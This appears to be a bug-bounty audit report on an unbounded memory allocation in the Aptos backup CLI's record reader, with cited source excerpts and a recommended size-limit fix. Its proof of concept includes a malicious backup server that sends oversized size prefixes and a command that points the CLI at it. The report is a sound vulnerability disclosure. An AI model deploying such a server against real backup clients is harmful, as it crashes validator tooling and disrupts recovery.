# Audit Report

## Title
Unbounded Memory Allocation in Backup CLI Record Reading Leads to Denial of Service

## Summary
The backup CLI's `read_record_bytes()` function allocates memory buffers based on untrusted u32 size prefixes received from the network without validation. A malicious or compromised backup service can send arbitrarily large size values (up to 4GB-1), causing the backup CLI to exhaust available memory and crash. This vulnerability violates the "Resource Limits" invariant requiring all operations to respect computational and memory constraints.

## Finding Description

The vulnerability exists in the backup CLI's record deserialization flow. When the backup CLI connects to a backup service to fetch epoch ending ledger infos, it reads serialized records prefixed with their size. [1](#0-0) 

The `ledger_infos_file.read_record_bytes()` call delegates to the `ReadRecordBytes` trait implementation, which performs the following without size validation: [2](#0-1) 

At line 54, the code reads a u32 size prefix from the network stream and casts it to `usize`. At line 60, it immediately allocates a buffer with capacity equal to this untrusted size value **without any validation or bounds checking**. Only after allocating and filling the buffer does any validation occur during BCS deserialization.

The backup service endpoint sends these size-prefixed records: [3](#0-2) 

The server-side serialization adds the size prefix: [4](#0-3) 

**Attack Scenario:**
1. Attacker runs a malicious backup service or compromises a legitimate one
2. Victim configures backup CLI to connect to the malicious endpoint via `--backup-service-address`
3. Malicious server responds to `epoch_ending_ledger_infos` requests with size prefix 0xFFFFFFFF (4GB-1)
4. Client attempts to allocate 4GB buffer at line 60 of `read_record_bytes.rs`
5. Allocation succeeds or fails with OOM, but either way causes memory exhaustion
6. Backup CLI crashes or becomes unresponsive
7. If running on validator node, may impact node stability

**Invariant Violation:**
This breaks Critical Invariant #9: "Resource Limits: All operations must respect gas, storage, and computational limits." The code allows unbounded memory allocation based on untrusted network input.

**Legitimate Record Sizes:**
Epoch ending ledger infos contain `LedgerInfoWithSignatures` which includes:
- LedgerInfo with BlockInfo (~200 bytes)
- EpochState with ValidatorVerifier (max ~136KB with 1000 validators)
- AggregateSignature with BitVec (max 8192 bytes enforced) and BLS signature (96 bytes) [5](#0-4) 

Even in extreme cases, legitimate records should never exceed 1MB. The absence of any size limit allows allocations up to 4GB.

## Impact Explanation

**Severity: High** (up to $50,000 per Aptos Bug Bounty)

This qualifies as High severity under:
- **"API crashes"**: The backup CLI tool crashes due to memory exhaustion
- **"Validator node slowdowns"**: If the backup CLI runs on a validator node, memory exhaustion can impact overall node performance

The attack causes:
1. **Denial of Service**: Backup operations cannot complete
2. **Resource Exhaustion**: System memory is consumed, potentially affecting co-located services
3. **Operational Impact**: Validators cannot perform backups, critical for disaster recovery

While this does not directly compromise consensus or funds, it disrupts critical operational tooling. If validators cannot backup their state, disaster recovery becomes impossible.

## Likelihood Explanation

**Likelihood: Medium to High**

The attack requires:
1. Attacker controls or compromises a backup service endpoint, OR
2. Attacker performs man-in-the-middle attack on backup service connection, OR
3. User misconfigures backup CLI to point to malicious server

The default configuration points to `localhost:6186`, requiring local node compromise. However: [6](#0-5) 

Users commonly configure backup CLI to pull from remote nodes for centralized backup operations. Any compromise of these endpoints enables the attack.

Additionally, the backup service runs over HTTP without mandated authentication, making interception feasible on untrusted networks.

## Recommendation

Add a maximum record size validation before allocating the buffer. Based on analysis of legitimate record structures, a 10MB limit provides ample headroom:

```rust
const MAX_RECORD_SIZE: usize = 10 * 1024 * 1024; // 10MB

async fn read_record_bytes(&mut self) -> Result<Option<Bytes>> {
    let _timer = BACKUP_TIMER.timer_with(&["read_record_bytes"]);
    
    // read record size
    let mut size_buf = BytesMut::with_capacity(4);
    self.read_full_buf_or_none(&mut size_buf).await?;
    if size_buf.is_empty() {
        return Ok(None);
    }

    let record_size = u32::from_be_bytes(size_buf.as_ref().try_into()?) as usize;
    if record_size == 0 {
        return Ok(Some(Bytes::new()));
    }

    // Validate record size
    if record_size > MAX_RECORD_SIZE {
        bail!(
            "Record size {} exceeds maximum allowed size {} bytes",
            record_size,
            MAX_RECORD_SIZE
        );
    }

    // read record
    let mut record_buf = BytesMut::with_capacity(record_size);
    self.read_full_buf_or_none(&mut record_buf).await?;
    if record_buf.is_empty() {
        bail!("Hit EOF when reading record.")
    }

    Ok(Some(record_buf.freeze()))
}
```

Apply this same validation to all backup record types (transactions, state snapshot chunks, etc.) that use the `read_record_bytes()` method.

## Proof of Concept

```rust
// File: storage/backup/backup-cli/src/utils/read_record_bytes_test.rs
#[cfg(test)]
mod exploit_test {
    use super::*;
    use tokio::io::AsyncReadExt;

    #[tokio::test]
    async fn test_unbounded_allocation_vulnerability() {
        // Malicious server response: size prefix = 1GB
        let malicious_size = 1_000_000_000u32;
        let mut malicious_stream = malicious_size.to_be_bytes().to_vec();
        // Don't send actual data, just the size prefix
        
        let mut reader = malicious_stream.as_slice();
        
        // This will attempt to allocate 1GB buffer
        // In production, this crashes with OOM or exhausts memory
        let result = reader.read_record_bytes().await;
        
        // Without the fix, this either:
        // 1. Succeeds in allocating 1GB (memory exhaustion)
        // 2. Fails with OOM error
        // 3. Hangs waiting for 1GB of data that never arrives
        
        // With the fix, should fail with size validation error
        assert!(result.is_err());
        if let Err(e) = result {
            assert!(e.to_string().contains("exceeds maximum allowed size"));
        }
    }
    
    #[tokio::test] 
    async fn test_maximum_size_attack() {
        // Attacker sends maximum possible size: 4GB-1
        let malicious_size = u32::MAX;
        let mut malicious_stream = malicious_size.to_be_bytes().to_vec();
        
        let mut reader = malicious_stream.as_slice();
        let result = reader.read_record_bytes().await;
        
        // Should reject this immediately
        assert!(result.is_err());
    }
}
```

To demonstrate the vulnerability, run a malicious backup service:

```rust
// Malicious backup service that sends huge size prefixes
use warp::Filter;

#[tokio::main]
async fn main() {
    let route = warp::path!("epoch_ending_ledger_infos" / u64 / u64)
        .map(|_start, _end| {
            // Send size prefix of 2GB
            let malicious_size = 2_000_000_000u32;
            let mut response = malicious_size.to_be_bytes().to_vec();
            // Send some garbage data but not 2GB worth
            response.extend(vec![0u8; 1000]);
            warp::reply::with_header(
                response,
                "content-type",
                "application/octet-stream"
            )
        });

    warp::serve(route).run(([127, 0, 0, 1], 6186)).await;
}
```

Run backup CLI against this malicious service:
```bash
cargo run -p backup-cli -- epoch-ending \
  --backup-service-address http://localhost:6186 \
  --start-epoch 0 --end-epoch 1 \
  one-shot backup --backup-storage-location /tmp/backup
```

The backup CLI will crash with OOM or hang attempting to allocate 2GB for each record.

## Notes

While the BitVec component enforces a maximum size of 8192 bytes during deserialization, this validation occurs **after** memory allocation. The vulnerability exploits the allocation phase before any semantic validation.

The issue affects all backup record types that use `read_record_bytes()`, not just epoch ending ledger infos. A comprehensive fix should be applied consistently across the backup CLI codebase.

### Citations

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/backup.rs (L90-108)
```rust
        while let Some(record_bytes) = ledger_infos_file.read_record_bytes().await? {
            if should_cut_chunk(&chunk_bytes, &record_bytes, self.max_chunk_size) {
                let chunk = self
                    .write_chunk(
                        &backup_handle,
                        &chunk_bytes,
                        chunk_first_epoch,
                        current_epoch - 1,
                    )
                    .await?;
                chunks.push(chunk);
                chunk_bytes = vec![];
                chunk_first_epoch = current_epoch;
            }

            waypoints.push(Self::get_waypoint(&record_bytes, current_epoch)?);
            chunk_bytes.extend((record_bytes.len() as u32).to_be_bytes());
            chunk_bytes.extend(&record_bytes);
            current_epoch += 1;
```

**File:** storage/backup/backup-cli/src/utils/read_record_bytes.rs (L44-67)
```rust
    async fn read_record_bytes(&mut self) -> Result<Option<Bytes>> {
        let _timer = BACKUP_TIMER.timer_with(&["read_record_bytes"]);
        // read record size
        let mut size_buf = BytesMut::with_capacity(4);
        self.read_full_buf_or_none(&mut size_buf).await?;
        if size_buf.is_empty() {
            return Ok(None);
        }

        // empty record
        let record_size = u32::from_be_bytes(size_buf.as_ref().try_into()?) as usize;
        if record_size == 0 {
            return Ok(Some(Bytes::new()));
        }

        // read record
        let mut record_buf = BytesMut::with_capacity(record_size);
        self.read_full_buf_or_none(&mut record_buf).await?;
        if record_buf.is_empty() {
            bail!("Hit EOF when reading record.")
        }

        Ok(Some(record_buf.freeze()))
    }
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L90-99)
```rust
    // GET epoch_ending_ledger_infos/<start_epoch>/<end_epoch>/
    let bh = backup_handler.clone();
    let epoch_ending_ledger_infos = warp::path!(u64 / u64)
        .map(move |start_epoch, end_epoch| {
            reply_with_bytes_sender(&bh, EPOCH_ENDING_LEDGER_INFOS, move |bh, sender| {
                bh.get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);
```

**File:** storage/backup/backup-service/src/handlers/bytes_sender.rs (L54-66)
```rust
    pub fn send_size_prefixed_bcs_bytes<Record: Serialize>(
        &mut self,
        record: Record,
    ) -> DbResult<()> {
        let record_bytes = bcs::to_bytes(&record)?;
        let size_bytes = (record_bytes.len() as u32).to_be_bytes();

        let mut buf = BytesMut::with_capacity(size_bytes.len() + record_bytes.len());
        buf.put_slice(&size_bytes);
        buf.extend(record_bytes);

        self.send_bytes(buf.freeze())
    }
```

**File:** crates/aptos-bitvec/src/lib.rs (L18-20)
```rust
// Every u8 is used as a bucket of 8 bits. Total max buckets = 65536 / 8 = 8192.
const BUCKET_SIZE: usize = 8;
const MAX_BUCKETS: usize = 8192;
```

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L22-31)
```rust
#[derive(Parser)]
pub struct BackupServiceClientOpt {
    #[clap(
        long = "backup-service-address",
        default_value = "http://localhost:6186",
        help = "Backup service address. By default a Aptos Node runs the backup service serving \
        on tcp port 6186 to localhost only."
    )]
    pub address: String,
}
```
